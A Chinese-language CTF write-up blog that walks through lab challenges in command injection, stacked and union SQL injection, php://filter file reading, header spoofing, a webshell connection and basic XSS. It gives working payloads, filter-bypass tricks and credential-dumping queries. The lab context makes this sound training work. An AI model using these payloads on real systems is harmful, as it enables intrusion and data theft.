<h2 id="ACTF2020-新生赛-Exec–命令执行"><a href="#ACTF2020-新生赛-Exec–命令执行" class="headerlink" title="[ACTF2020 新生赛]Exec–命令执行"></a>[ACTF2020 新生赛]Exec–命令执行</h2><p>开启靶机,发现是一个简易实现ping命令的文本输入框。<br>那么就是简单的命令执行,说到命令执行,那么就要思考以下几点:<br>1、对方是什么操作系统:windows|linux?<br>2、可不可以多条命令一起执行?<br>首先判断os,这里先抓包看,但是看不出来。<br><img src="https://pic.imgdb.cn/item/653bd9eac458853aef60f2cf.jpg" alt="图九" title="抓包判断os"><br>那么只能盲猜,先用ipconfig再用ifconfig<br>这里ipconfig没反应,但是ifconfig有反应,所以必是linux系统且支持多条命令执行。<br>如127.0.0.1;ifconfig(推荐.;是linux中的管道符)或127.0.0.1;ifconfig。<br><img src="https://pic.imgdb.cn/item/653bdac7c458853aef6559e5.jpg" alt="图十" title="盲猜"><br>知道这一点,那么我们就可以自定义命令找flag了。<br>先查看当前目录,发现只有一个index.php文件,明显flag不存在于此处。<br><img src="https://pic.imgdb.cn/item/653bdaedc458853aef6613bc.jpg" alt="图十一" title="探针到一个文件"><br>使用:”ls -al &#x2F;“ 是一个在命令行中使用的命令。它的作用是列出根目录下所有文件和文件夹的详细信息。<br><img src="https://pic.imgdb.cn/item/653bdb4ac458853aef692236.jpg" alt="图十二" title="发现目标"><br>最后查看flag(这里一定要cat &#x2F;flag而不可以cat flag)<br><img src="https://pic.imgdb.cn/item/653bdb51c458853aef695a75.jpg" alt="图十三" title="获取flag"></p>
<h2 id="GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计"><a href="#GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计" class="headerlink" title="[GXYCTF2019]Ping Ping Ping–命令执行|代码审计"></a>[GXYCTF2019]Ping Ping Ping–命令执行|代码审计</h2><p>开启靶机,提示很明显,就是一个ip属性值接收IP地址ping。<br>但是依旧可以多条命令执行,但是这里用到linux的管道符”;”,原因是在网址栏操作。<br>那么我们先看下ip康康是否支持。<br><img src="https://pic.imgdb.cn/item/653c737dc458853aef34db78.jpg" alt="图十四" title="管道符"><br>确实可以,那么就可以接着往下了。我想一步到位直接读取flag,但是发现空格被过滤了<br><img src="https://pic.imgdb.cn/item/653c73edc458853aef366532.jpg" alt="图十五" title="空格过滤"><br>退而求其次,绕过空格过滤<br>空格的绕过方法为:</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel"><span class="hljs-number">1.</span>$RIFS)替换<br><span class="hljs-number">2.</span>$IFS$1替换<br><span class="hljs-number">3.</span>$KIFS替换<br><span class="hljs-number">4.</span>%20替换<br><span class="hljs-number">5.</span>&lt;和&lt;&gt;重定向符替换<br><span class="hljs-number">6.</span>%09替换<br></code></pre></td></tr></table></figure>
<p>全部进行实验可以发现只有$IFS$1可以绕过但同时也发现flag也被过滤<br><img src="https://pic.imgdb.cn/item/653c73fac458853aef368ed2.jpg" alt="图十六" title="绕过空格但是flag也被过滤"><br>没办法,只可以读取index.php看看过滤规则<br><img src="https://pic.imgdb.cn/item/653c740ec458853aef36d458.jpg" alt="图十七" title="利用代码里面的漏洞进行过滤"><br>可以知道,过滤全是正则,什么大小写都不行,但存在一个变量$a,那么我们可以利用这个进行传参实现绕过。<br>payload:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure>
<p>这里打开后不会立刻看到flag,那么我们就要坚定内心,坚信自己一定没错究竟是在哪里呢,查看源码成功获取flag。<br><img src="https://pic.imgdb.cn/item/653c7419c458853aef36fd3c.jpg" alt="图十八" title="查看源码获取flag"><br>参考:<a href="https://blog.csdn.net/2301_78136321/article/details/133294740">https://blog.csdn.net/2301_78136321/article/details/133294740</a><br>这道题我觉得是有点恶心的,对于我来说前面已经耗费太多精力了,本想着终于获取到flag了,但是空空如也还看看源码,心态容易崩,还要继续提升。</p>
<h2 id="强网杯-2019-随便注–SQL注入-堆叠注入"><a href="#强网杯-2019-随便注–SQL注入-堆叠注入" class="headerlink" title="[强网杯 2019]随便注–SQL注入|堆叠注入"></a>[强网杯 2019]随便注–SQL注入|堆叠注入</h2><p>开启靶机,是一个熟悉的sql注入题目(有提示)。<br>先判断有无注入点以及是字符型或者数字型。<br>这里测试出来存在注入点以及是字符型(输入1没报错,1’报错)。<br><img src="https://pic.imgdb.cn/item/653c7c44c458853aef5534cd.jpg" alt="图十九" title="判断有无注入点以及是字符型或者数字型"><br>!!!tips:想说一句,看到带输入框的,尽量把注入语句写到框内<br>继续测试,这里用or而非and(原因是前面1’错误,or后面的1&#x3D;1为真,那么总体为真就会把所有数据都输出;而and只会报错输出一个)。<br>也就是:or爆全;and爆一个。<br><img src="https://pic.imgdb.cn/item/653c7c49c458853aef55455b.jpg" alt="图二十" title="or"><br>接着使用order by判断列数。<br><img src="https://pic.imgdb.cn/item/653c7c57c458853aef5575ff.jpg" alt="图二十一" title="order by判断列数"><br><img src="https://pic.imgdb.cn/item/653c7c5ec458853aef558cd9.jpg" alt="图二十二" title="order by判断列数"><br>判断出来是存在两列,猜测是id号+数据。开始真正意义上的注入<br>先来一个union+select(大小写均是一遍)<br>发现存在过滤<br><img src="https://pic.imgdb.cn/item/653c97aac458853aefb6d4a9.jpg" alt="图二十三" title="发现存在过滤"><br>返回一个正则过滤规则，可以看到几乎所有常用的字段都被过滤了。这里尝试过双写绕过，16进制绕过等；不过过滤机制太强，都不行。<br>这里技穷了,没有任何思路,看了下wp,才想到可以堆叠注入(注意使用数据库语句)。<br>先试着查一下数据库</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p>成功查询到,说明存在堆叠注入,那么我们后面都围绕堆叠注入展开。<br><img src="https://pic.imgdb.cn/item/653c9845c458853aefb9b864.jpg" alt="图二十四" title="存在堆叠"><br>再爆表<br><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十五" title="堆叠爆表"><br>可以看到当前库下有两张表（1919810931114514和words）。<br>先查words表中的列名</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>发现只有id与data两个字段,应该不存在flag,继续看下一个表先。<br><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十六" title="堆叠爆字段"><br>注意:<br>对于纯数字的表名,要用&#96;&#96;括起来<br>就是tableName是纯数字，需要用<code>包裹，比如 方式一:1&#39;;desc </code>1919810931114514<code>;# 方式二:1&#39;; show columns from</code>1919810931114514&#96;;#<br>发现存在flag字段,就差一步了,加油。<br><img src="https://pic.imgdb.cn/item/653c9861c458853aefba4716.jpg" alt="图二十七" title="爆出存在flag的表"><br>最后读取这一步,又不会了,继续借鉴。<br>!!!该题目的查询语句很有可能是：selsect id,data from words where id &#x3D;，因为我们输入1，回显的是两个字段，这与words表符合，而1919810931114514表中只有一列,那怎么办呢。<br>4种方法:<br>1、多方了解,才想到改名,就是它的查询语句是selsect id,data from words where id &#x3D;,那么我们令原来的words表为另一个名字,而我们的目标1919810931114514这张表改为words,那么我们查询的时候,就会带入这个带有flag的表查询,从而爆出flag。<br>数据库知识:<br>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；<br>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；<br>构造payload:把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;alter table <span class="hljs-built_in">words</span> rename <span class="hljs-keyword">to</span> words1;alter table `<span class="hljs-number">1919810931114514</span>` rename <span class="hljs-keyword">to</span> <span class="hljs-built_in">words</span>;alter table <span class="hljs-built_in">words</span> change flag <span class="hljs-built_in">id</span> varchar(<span class="hljs-number">50</span>);<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>这就实现了改名功能,只爆一个字段(id&#x2F;data)不影响,然后像刚开始那样子测试有无注入点那样,直接爆出flag。<br><img src="https://pic.imgdb.cn/item/653c986cc458853aefba7b6f.jpg" alt="图二十八" title="改名爆flag"><br>后面三种搬运一下,做知识总结。<br>2、handle函数。<br>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：<br>打开表：HANDLER 表名 OPEN ;<br>查看数据： HANDLER 表名 READ next;<br>关闭表： HANDLER 表名 READ CLOSE;</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><code class="hljs julia"><span class="hljs-number">1</span>&#x27;;HANDLER <span class="hljs-string">`1919810931114514`</span> OPEN;HANDLER <span class="hljs-string">`1919810931114514`</span> READ next;HANDLER <span class="hljs-string">`1919810931114514`</span> CLOSE;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>3、预编译方式<br>因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：<br>预编译相当于定一个语句相同，参数不同的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,格式：<br>1.PREPARE 名称 FROM Sql语句 ? ;<br>2.SET @x&#x3D;xx;<br>EXECUTE 名称 USING @x;<br>例子:1’;PREPARE hacker from concat(‘s’,’elect’, ‘ * from <code>1919810931114514</code> ‘);EXECUTE  hacker;#<br>将select * from <code>1919810931114514</code>语句进行16进制编码，即：0x73656c656374202a2066726f6d2060313931393831303933313131343531346</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;PREPARE ck from 0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;EXECUTE  ck;#<br></code></pre></td></tr></table></figure>
<p>4、利用MySql预处理<br>使用条件：HANDLER也被过滤了。<br>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。<br>最后总结一句话:安全与开发缺一不可。<br>参考：<a href="https://blog.csdn.net/qq_44640313/article/details/128308237">https://blog.csdn.net/qq_44640313/article/details/128308237</a></p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>进入靶机,首先判断有无注入点。<br>输入1以上的int数据,发现有回显;而输入其他值则无回显。<br><img src="https://pic.imgdb.cn/item/65420741c458853aeff5cc1b.jpg" alt="图二十九" title="回显"><br><img src="https://pic.imgdb.cn/item/65420750c458853aeff5f3e6.jpg" alt="图三十" title="回显"><br>进一步测试,测试是数字型注入或者是字符行注入。</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and 1=1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; or 1=1#</span><br></code></pre></td></tr></table></figure>
<p>这些payload全都测试过了,无一例外,全都回显nonono。<br><img src="https://pic.imgdb.cn/item/6542078ac458853aeff685d1.jpg" alt="图三十一" title="发现存在过滤"><br>说明存在and过滤|输出nonono说明存在过滤,存在对某一个字符串的过滤。<br>既然存在注入,连盲注都不能测试了,因为盲注语句也用到and&#x2F;or&#x2F;updatexml等。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=xiaodi&#x27;or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,version(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">0</span>) or&#x27;&amp;password=<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
<p>那就只能尝试堆叠注入了。<br>输入payload:</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span><span class="hljs-comment">;show databases;</span><br></code></pre></td></tr></table></figure>
<p>成功爆出数据库。<br><img src="https://pic.imgdb.cn/item/65420797c458853aeff6a7d3.jpg" alt="图三十二" title="爆库"><br>接着爆表。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654207a6c458853aeff6cf7e.jpg" alt="图三十三" title="爆表"><br>再尝试爆表的字段</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> FLAG;<br></code></pre></td></tr></table></figure>
<p>输出nonono,发现对flag存在过滤。<br>到这里,思路戛然而止,暂停略微参考一下wp。<br>接下来回顾一下最开始我们输入的非0数字和0与字母所回显的内容：非0数字回显1,0和字母不会回显任何内容<br>先了解一下||操作符：<br>在MySQL中，操作符||表示“或”逻辑：<br>command1 || command2<br>c1和c2其中一侧为1则取1，否则取0<br> 这里猜测后端语句，因为只有当我们输入非零数字时才会会显出1，而0和其他全都无回显,而猜测逻辑大致是这样的：大胆猜测后端（内部查询语句）语句中有||操作符，只有我们输入非零数字才会满足||的逻辑为True从而进行回显的条件。也就是满足:select 输入的内容 ||  一个列名 from 表名。（select 输入数据 || flag from Flag）<br>确实很大胆.真的没想到ctf的题会这样考,利用mysql的’||’的逻辑把flag藏到后面,有回显但是回显’||’前面判断为真或假的值,以这样的方式藏flag。<br>那么这样的话,构造payload,就把mysql中’||’的逻辑改成连接的逻辑:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">1;<span class="hljs-built_in">set</span> <span class="hljs-attribute">sql_mode</span>=PIPES_AS_CONCAT;select 1<br>注：<br>(mssql中的<span class="hljs-string">&#x27;||&#x27;</span>就是连接的逻辑)<br>1、这里需要借用到：设置 <span class="hljs-attribute">sql_mode</span>=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）。<br>2、这里的逻辑是先把||转换为连接操作符，注意分号隔断了前面的命令，所以要再次添加select来进行查询，这里把1换成其他非零数字也一样会回显flag。<br></code></pre></td></tr></table></figure>
<p>这样就可获取到flag。<br><img src="https://pic.imgdb.cn/item/654207b5c458853aeff6f5a1.jpg" alt="图三十四" title="修改mysql的&#39;||&#39;的逻辑爆flag"><br>参考:<code>https://blog.csdn.net/m0_62851980/article/details/124083026</code><br>总结出一套做sql注入的思路<br>1、先判断有无注入点:把字符全试一遍,看看有无规律,找出其逻辑;<br>   再用and&#x2F;or进一步判断;<br>2、再爆列数;<br>3、联合查询,先爆库,再爆表,再爆字段,最后爆数据;<br>4、若存在select等过滤,用到报错盲注或堆叠注入。</p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开靶机,显示xxx的秘密,我不关心,我只关心zhaoflag然后吃西瓜。<br>看源码,有一个超链接,点开看一下,发现跳转到另一个界面,有一个大大的SELECT;点击进去,来到一个看起来是最后一个界面的界面,抓包看一下<br>发现一个文件<br><img src="https://pic.imgdb.cn/item/65421219c458853aef12072f.jpg" alt="图三十五" title="我只会吃西瓜"><br>跳转过去,发现flag所处位置以及文件的接收方式是以file作为属性接收的,且以get方式提交。<br><img src="https://pic.imgdb.cn/item/65421235c458853aef124699.jpg" alt="图三十六" title="serc3t的内容(这是一个关键的文件)"><br>进入flag.php,发现是一场空欢喜。<br><img src="https://pic.imgdb.cn/item/654212dec458853aef13d351.jpg" alt="图三十七" title="空欢喜"><br>看不到flag,那么就又要考虑到php伪协议。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>看到flag。<br><img src="https://pic.imgdb.cn/item/654212e4c458853aef13e159.jpg" alt="图三十八" title="php伪协议获取base64编码的flag"><br>看编码形式像base64编码,解码即可。得到flag。<br><img src="https://pic.imgdb.cn/item/654212f1c458853aef140081.jpg" alt="图三十九" title="解码得到flag"></p>
<p><code>!!!发现php伪协议配合文件包含挺多的。学习一下php伪协议。</code></p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>1、配合文件读取,即网址栏含有?file&#x3D;或?filename&#x3D;诸如此类的字段–前提<br>2、再配合文件包含,即猜测其代码存在include某一个文件–关键<br>3、这样,即可尝试使用php伪协议读取那个文件。<br>常用payload(做题暂只遇到这一种):</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xxx.xxx.xxx<span class="hljs-regexp">/index.php?filename=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=xxx.php<br>作用:读取当前文件包含的文件。<br></code></pre></td></tr></table></figure>
<p>推荐阅读(详细讲解):<br><code>https://www.php.cn/faq/481803.html</code><br><code>https://blog.csdn.net/qq_37466661/article/details/126203437</code><br><code>https://blog.csdn.net/m0_56107268/article/details/127760614</code><br>但也存在限制,具体的限制看我的博客:<code>https://fzsecurity-github.github.io/2023/10/14/wenjianbaohan/?highlight=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB</code></p>
<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>嗯,我很爱sql……<br>进入靶机,是一个登陆界面,首先正常输入账号密码,嗯,返回一个账号密码错误的界面。那么测试有无注入点。</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and 1=1#</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; or 1=1#</span><br></code></pre></td></tr></table></figure>
<p>其中,在账号栏一行中输入1’ or 1&#x3D;1#而且密码栏随便输入(以为存在先判断密码栏是否为空,再判断账号密码是否对上),发现即使不输入密码也显示出来信息。<br><img src="https://pic.imgdb.cn/item/65427681c458853aef667be3.jpg" alt="图四十" title="测试有无注入点时直接获取一个信息"><br>思考,我刚开始以为是某种编码,但是尝试了很多种编码的解码,一一失败,判定为乱码,那么只能进一步注入。<br>前期知道为字符型get注入,那么先判定字段数。<br>首先测试3字段,发现正常报错(输出查询异常信息);但是输入4的时候直接报错显示不存在4这个字段。即判定3字段。</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span><span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65427699c458853aef66db16.jpg" alt="图四十一" title="4列报错"><br><img src="https://pic.imgdb.cn/item/654276a5c458853aef670c4b.jpg" alt="图四十二" title="3行正常"><br>随后显示具体字段在哪个位置爆出<br>payload(密码随便填)：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654276cfc458853aef67f284.jpg" alt="图四十三" title="知道爆数据的位置"><br><code>这里有一个注意点:</code><br><code>经过测试,猜测该网站的后台代码会对接受过来的数据进行一次url解码,所以你在url栏输入payload时,你要进行url编码再填充进去。</code><br><code>如果你直接在账号输入栏测试则不需要。</code><br>好了,开始ggboom。<br>首先爆一些数据库名字,版本的相关信息。</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-built_in">version</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6543096cc458853aef746dc3.jpg" alt="图四十四" title="爆数据库基本信息"><br>然后,可以尝试使用mysql注入的思路,先判断mariaDB是否存在关键的几张表。<br><img src="https://pic.imgdb.cn/item/654309a5c458853aef74ec96.jpg" alt="图四十五" title="选择思路"><br>那么可以使用注入mysql数据库的思路。<br>爆库(可省略)</p>
<figure class="highlight capnproto"><table><tr><td class="code"><pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309c5c458853aef753670.jpg" alt="图四十六" title="爆库"><br>爆表</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;geek&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654309d7c458853aef756b74.jpg" alt="图四十七" title="爆表"><br>爆字段(先爆l0ve1ysq1这张表,再爆geekuser这张表)</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;geekuser&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p>发现字段都一样<br><img src="https://pic.imgdb.cn/item/654309e1c458853aef758713.jpg" alt="图四十八" title="爆字段"><br>那么爆字段值(数据)吧</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">username</span>)</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">password</span>)</span> from geekuser#<br></code></pre></td></tr></table></figure>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">username</span>)</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">password</span>)</span> from l0ve1ysq1#<br></code></pre></td></tr></table></figure>
<p> geekuser表中数据为<br> <img src="https://pic.imgdb.cn/item/654309fec458853aef75d16e.jpg" alt="图四十九" title="爆数据(字段)--geekuser"><br> geekuser的数据还是乱码,解析不了。那么寄希望于下一张表,l0ve1ysq1表中数据为<br> <img src="https://pic.imgdb.cn/item/65430a0fc458853aef75f9aa.jpg" alt="图五十" title="爆数据(字段)--l0ve1ysq1"><br>看不全,查看源码,获取flag<br> <img src="https://pic.imgdb.cn/item/65430a1ec458853aef761bbd.jpg" alt="图五十一" title="获取flag"><br> 总算是一道正常的没有堆叠的注入题了…嗯,lovesql。</p>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>打开靶机,界面是一个正常的网页,第一件事先看源码,发现确实有一个.php文件可以访问。<br><img src="https://pic.imgdb.cn/item/654317b9c458853aef96c798.jpg" alt="图五十二" title="发现关键key"><br>尝试访问,发现是一个warning,提示来源(Referer)必须是<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a><br><img src="https://pic.imgdb.cn/item/65431865c458853aef9861b9.jpg" alt="图五十三" title="warning"><br>抓包修改,wp说:<code>这里有一个注意点，那就是你加的Referer字段必须在connection字段下面,不然会报错</code> –为什么,就算没在下面也可以<br><img src="https://pic.imgdb.cn/item/65431882c458853aef98a7ac.jpg" alt="图五十四" title="改包"><br>提示要使用浏览器Syclover,那么在user-agent字段修改<br><img src="https://pic.imgdb.cn/item/654318dbc458853aef996b19.jpg" alt="图五十五" title="二次改包"><br>提示要本地访问,那么添加一个X-Forwarded-For字段,值为127.0.0.1即可获取flag<br><img src="https://pic.imgdb.cn/item/65431904c458853aef99cb0d.jpg" alt="图五十六" title="改包获取flag"><br><code>(建议康康)关于数据包的一些讲解:https://blog.csdn.net/qq_63548648/article/details/128083782</code></p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>打开靶机,提示菜刀不见了,还给了一句话木马,推测其网站下的目录存在有包含这个一句话木马的文件。想都不用想,连接上去就完事了。<br><img src="https://pic.imgdb.cn/item/65435b00c458853aef573dbc.jpg" alt="图五十七" title="看到一句话木马,直接连接"><br>点击测试连接,提示连接成功,成功getshell,就可getflag。<br><img src="https://pic.imgdb.cn/item/65435b11c458853aef576820.jpg" alt="图五十八" title="getshell|getflag"><br>这么简单?不可置信,看了看源码,嗯果然是白给的shell…</p>
]]></content>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-labs通关little心得</title>
    <url>/2023/10/12/XssSelfPrac2/</url>
    <content><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>修改name属性的值,发现页面回显也随之变化,那么我们便可以考虑向此处插入js语句<br><img src="https://pic.imgdb.cn/item/6527faa3c458853aefb0929f.png" alt="图一" title="level-1.1"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6527fadec458853aefb1a100.png" alt="图二" title="level-1.2"><br>点击搜索,成功,直接进入下一关。</p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>直接在搜索框插入以下语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>发现通关失败。<br>右键-查看元素<br><img src="https://pic.imgdb.cn/item/6527fc52c458853aefb859ae.png" alt="图三" title="level-2.1"><br>发现js语句被””号扩了起来,发挥不了作用,那么我们直接利用闭合的思想。填入payload,点击搜索,成功通关。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>来到第三关,啥也不想,直接把上一关的通关语句填入,失败,那好继续查看元素。<br><img src="https://pic.imgdb.cn/item/6527fdcdc458853aefbf5be2.png" alt="图四" title="level-3.1"><br>发现很奇怪,明明就像第二关一样,利用了闭合的思想,那为什么还是通关不了。<br>这里要用到代码审计,查看源码<br><img src="https://pic.imgdb.cn/item/6527fe37c458853aefc16465.png" alt="图五" title="level-3.2"><br>后端利用htmlspecialchars()函数会将特殊字符进行转义，这里无法采用标签，因为标签都是带有”&lt;”的。但该函数不会转义单引号，可以采用事件(onclick,可以实现和标签一样的功能)闭合标签。填入以下payload(注意闭合),点击搜索框(不是搜索,因为点击事件要在框内触发),成功。</p>
